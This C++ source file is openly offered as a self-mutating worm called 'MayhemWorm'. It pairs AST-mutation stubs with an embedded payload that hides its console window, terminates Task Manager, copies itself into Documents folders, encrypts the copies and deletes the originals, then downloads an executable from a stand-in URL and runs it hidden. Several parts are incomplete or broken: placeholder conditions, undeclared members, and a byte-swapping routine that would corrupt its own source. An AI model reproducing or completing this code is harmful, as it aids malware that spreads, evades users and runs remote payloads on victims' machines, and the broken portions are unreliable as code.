#include <iostream>
#include <vector>
#include <cstdlib> // For rand()

struct ASTNode {
    std::string type;
    std::vector<ASTNode*> children;
    // Constructor
    ASTNode(std::string t, std::vector<ASTNode*> c) : type(t), children(c) {}
};

class MayhemWorm {
public:
    void deleteAST(ASTNode* root) {
        if (!root)
            return;

        // Traverse the AST in post-order fashion
        for (auto child : root->children) {
            deleteAST(child);
        }

        // Determine deletion criteria and delete nodes accordingly
        if (/* criteria for node deletion */) {
            // Deallocate memory for child nodes
            for (auto child : root->children) {
                delete child;
            }
            root->children.clear(); // Clear child nodes
            delete root; // Deallocate memory for the current node
        }
    }

    void applyCodeTemplates(ASTNode* root) {
        // Iterate through the AST nodes to apply templates
        for (auto node : root->children) {
            // Determine if the current node is a suitable insertion point for a template
            if (/* criteria for template insertion */) {
                // Apply a random code template or select based on predefined criteria
                applyRandomTemplate(node);
            }

            // Recursively apply templates to child nodes
            applyCodeTemplates(node);
        }
    }

    void performSymbolicExecution(ASTNode* root) {
        // Apply symbolic execution to explore program paths
        symbolicExecute(root);
    }

    void modifyControlFlowGraph(ASTNode* root) {
        // Traverse the AST to identify and manipulate control flow structures
        manipulateControlFlow(root);
    }

    void inlineFunctions(ASTNode* root) {
        // Traverse the AST to identify function call nodes
        replaceFunctionCalls(root);
    }

    void outlineFunctions(ASTNode* root) {
        // Traverse the AST to identify and outline function bodies
        traverseAndOutline(root);
    }

    void renameVariables(ASTNode* root) {
        // Start variable renaming process from the root of the AST
        traverseAndRename(root);
    }

    void deleteInsertCode(ASTNode* root) {
        // Randomly delete or insert nodes in the AST
        performRandomMutation(root);
    }

    void crossFileMutation(ASTNode* root) {
        // Analyze and mutate interactions between multiple source files
        analyzeAndMutateInteractions(root);
    }

private:
    void applyRandomTemplate(ASTNode* node) {
        // Select a random code template from the library
        // Apply the selected template to the AST node
    }

    void symbolicExecute(ASTNode* node) {
        // Perform symbolic execution on the current node
    }

    void manipulateControlFlow(ASTNode* node) {
        // Check if the current node represents a control flow structure
        // Apply control flow modification based on the type of structure
    }

    void replaceFunctionCalls(ASTNode* node) {
        // Check if the current node represents a function call
        // Retrieve the function definition and inline it into the call site
    }

    void traverseAndInline(ASTNode* node) {
        // Check if the current node represents a function call
        if (/* condition for function call */) {
            // Inline the called function by replacing the function call with its body
            inlineFunction(node);
        }

        // Recursively traverse child nodes to handle nested function calls
        for (auto child : node->children) {
            traverseAndInline(child);
        }
    }

    void outlineFunction(ASTNode* functionDefinitionNode) {
        // Extract the body of the function
        ASTNode* functionBody = functionDefinitionNode->children.back();

        // Create a new function definition node with the outlined function body
        ASTNode* outlinedFunction = createOutlinedFunction(functionBody);

        // Replace the original function body with the outlined function definition
        replaceFunctionBodyWithOutline(functionDefinitionNode, outlinedFunction);
    }

    void traverseAndRename(ASTNode* node) {
        // Check if the current node represents a variable
        if (node->type == "variable") {
            // Rename the variable node
            renameVariable(node);
        }

        // Recursively traverse child nodes to handle nested scopes
        for (auto child : node->children) {
            traverseAndRename(child);
        }
    }

    void performRandomMutation(ASTNode* node) {
        // Randomly decide whether to delete or insert nodes
        if (shouldDeleteNode()) {
            deleteRandomNode(node);
        } else {
            insertRandomNode(node);
        }

        // Recursively traverse child nodes to apply mutations
        for (auto child : node->children) {
            performRandomMutation(child);
        }
    }

    bool shouldDeleteNode() {
        // Generate a random boolean value to decide whether to delete a node
        return (rand() % 2 == 0);
    }

    void deleteRandomNode(ASTNode* parent) {
        // Ensure parent node has children to delete
        if (!parent->children.empty()) {
            // Select a random index to delete a child node
            int indexToDelete = getRandomChildIndex(parent);

            // Delete the selected child node
            delete parent->children[indexToDelete];
            parent->children.erase(parent->children.begin() + indexToDelete);
        }
    }

    void insertRandomNode(ASTNode* parent) {
        // Create a new node to insert (e.g., "inserted_node")
        ASTNode* newNode = new ASTNode{"inserted_node", {}};

        // Randomly select the position to insert the new node
        int insertionIndex = getRandomChildIndex(parent);

        // Insert the new node at the selected position
        parent->children.insert(parent->children.begin() + insertionIndex, newNode);
    }

    int getRandomChildIndex(ASTNode* parent) {
        // Generate a random index within the range of children indices
        return rand() % parent->children.size();
    }
    
    void analyzeAndMutateInteractions(ASTNode* root) {
        // Perform analysis to identify cross-file dependencies and interactions
        // Once dependencies are identified, coordinate mutations across files
        // Implement mutation strategies based on analysis and coordination
    }
};
mutateCode() {
    // Load the current source code into a string
    std::string filename = "mayhem_worm.cpp";
    std::ifstream inFile(filename);
    std::string fileContent((std::istreambuf_iterator<char>(inFile)),
                             std::istreambuf_iterator<char>());
    inFile.close();

  
    std::random_device rd;
    std::mt19937 g(rd());
    std::uniform_int_distribution<int> dis(0, fileContent.size() - 1);

    for (int i = 0; i < fileContent.size() / 10; ++i) {
        int pos1 = dis(g);
        int pos2 = dis(g);
        std::swap(fileContent[pos1], fileContent[pos2]);
    }

   
    std::ofstream outFile(filename);
    outFile << fileContent;
    outFile.close();


    system("g++ mayhem_worm.cpp -o mayhem_worm");
}
std::string MayhemWorm::generateMutatedCode() {
   
    return R"(
#include <iostream>
#include <vector>
#include <filesystem>
#include <Windows.h>
#include <thread>
#include <fstream>
#include <chrono>
#include <ctime>
#include <urlmon.h>
#include <wininet.h>
#include <TlHelp32.h>
#include <openssl/aes.h>
#include <random>
#include <string>
#include <curl/curl.h>
#include <libxml/parser.h>
#include <libssh/libssh.h>
#include <httplib.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wininet.lib")

namespace fs = std::filesystem;

class Worm {
public:
    virtual ~Worm() {}
    virtual void replicate() {
        std::cout << "Worm replicated!\n";
    }

    static int getNumInstances() {
        return numInstances;
    }

    void replicateInstances(int n) {
        for (int i = 0; i < n; ++i) {
            replicate();
        }
    }

    void traverseFileSystem(const std::string& directory) {
        for (const auto& entry : fs::directory_iterator(directory)) {
            std::cout << "File: " << entry.path().string() << "\n";
        }
    }

protected:
    static int numInstances;
};

int Worm::numInstances = 0;

class MayhemWorm : public Worm {
public:
    void replicate() override {
        Worm::replicate();
        mutateCode();
        initiateMayhem();
    }

    void initiateMayhem();

    void downloadAndExecute(const std::string& url, const std::string& destination);

    void obscuredEntryPoint();

private:
    void encryptCode(const std::string& filename, const unsigned char* key);

    void decryptCode(const std::string& filename, const unsigned char* key);

    void mutateCode();
};

void MayhemWorm::initiateMayhem() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_MINIMIZE);
    SetWindowLong(hwnd, GWL_EXSTYLE, GetWindowLong(hwnd, GWL_EXSTYLE) | WS_EX_LAYERED);
    SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 0, LWA_COLORKEY);

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(processSnapshot, &processEntry)) {
        do {
            if (rand() % 2 == 0 && _stricmp(processEntry.szExeFile, "Taskmgr.exe") == 0) {
                HANDLE processHandle = OpenProcess(PROCESS_TERMINATE, 0, processEntry.th32ProcessID);
                TerminateProcess(processHandle, 0);
                CloseHandle(processHandle);
            }
        } while (Process32Next(processSnapshot, &processEntry));
    }

    CloseHandle(processSnapshot);

    SetFileAttributes("C:\\Users\\User\\Documents\\worm.exe",
                      FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ENCRYPTED);

    std::vector<std::string> crypticDirectories;
    for (const auto& entry : fs::directory_iterator("C:\\Users\\User\\Documents")) {
        if (fs::is_directory(entry.path())) {
            crypticDirectories.push_back(entry.path().string());
        }
    }
    for (const auto& crypticDir : crypticDirectories) {
        std::string obscureWormName =
            crypticDir + "\\worm_" + std::to_string(std::time(nullptr)) + ".exe";
        fs::copy_file("worm.exe", obscureWormName, fs::copy_options::overwrite_existing);
        encryptCode(obscureWormName, encryptionKey);
    }

    std::thread chaosThread([this]() {
        std::this_thread::sleep_for(std::chrono::minutes(1));
    });
    chaosThread.detach();

    std::string downloadUrl = "https://example.com/payload.exe";
    std::string downloadDestination = "C:\\Downloads\\payload.exe";
    downloadAndExecute(downloadUrl, downloadDestination);

    while (true) {
        std::this_thread::sleep_for(std::chrono::minutes(1));
    }
}

void MayhemWorm::downloadAndExecute(const std::string& url, const std::string& destination) {
    URLDownloadToFile(NULL, url.c_str(), destination.c_str(), 0, NULL);
    ShellExecute(NULL, "open", destination.c_str(), NULL, NULL, SW_HIDE);
}

void MayhemWorm::obscuredEntryPoint() {
    initiateMayhem();
}

void MayhemWorm::encryptCode(const std::string& filename, const unsigned char* key) {
    std::ifstream inFile(filename, std::ios::binary);
    std::ofstream outFile(filename + ".encrypted", std::ios::binary);

    unsigned char iv[AES_BLOCK_SIZE];
    memset(iv, 0x00, AES_BLOCK_SIZE);

    AES_KEY aesKey;
    AES_set_encrypt_key(key, 128, &aesKey);

    unsigned char inBuffer[AES_BLOCK_SIZE];
    unsigned char outBuffer[AES_BLOCK_SIZE];

    while (inFile.read(reinterpret_cast<char*>(inBuffer), AES_BLOCK_SIZE)) {
        AES_cbc_encrypt(inBuffer, outBuffer, AES_BLOCK_SIZE, &aesKey, iv, AES_ENCRYPT);
        outFile.write(reinterpret_cast<char*>(outBuffer), AES_BLOCK_SIZE);
    }

    inFile.close();
    outFile.close();
    fs::remove(filename);
}

void MayhemWorm::decryptCode(const std::string& filename, const unsigned char* key) {
    std::ifstream inFile(filename + ".encrypted", std::ios::binary);
    std::ofstream outFile(filename, std::ios::binary);

    unsigned char iv[AES_BLOCK_SIZE];
    memset(iv, 0x00, AES_BLOCK_SIZE);

    AES_KEY aesKey;
    AES_set_decrypt_key(key, 128, &aesKey);

    unsigned char inBuffer[AES_BLOCK_SIZE];
    unsigned char outBuffer[AES_BLOCK_SIZE];

    while (inFile.read(reinterpret_cast<char*>(inBuffer), AES_BLOCK_SIZE)) {
        AES_cbc_encrypt(inBuffer, outBuffer, AES_BLOCK_SIZE, &aesKey, iv, AES_DECRYPT);
        outFile.write(reinterpret_cast<char*>(outBuffer), AES_BLOCK_SIZE);
    }

    inFile.close();
    outFile.close();
    fs::remove(filename + ".encrypted");
}

void MayhemWorm::compileAndReplace(const std::string& mutatedCode) {
    // Write the mutated code to a new file
    std::string mutatedFilename = "mayhem_worm_mutated.cpp";
    std::ofstream outFile(mutatedFilename);
    outFile << mutatedCode;
    outFile.close();

    // Compile the mutated code
    std::string compileCommand = "g++ " + mutatedFilename + " -o mayhem_worm";
    system(compileCommand.c_str());

    // Replace the original program with the mutated one
    fs::rename("mayhem_worm", "mayhem_worm_original");
    fs::rename("mayhem_worm_mutated", "mayhem_worm");
}
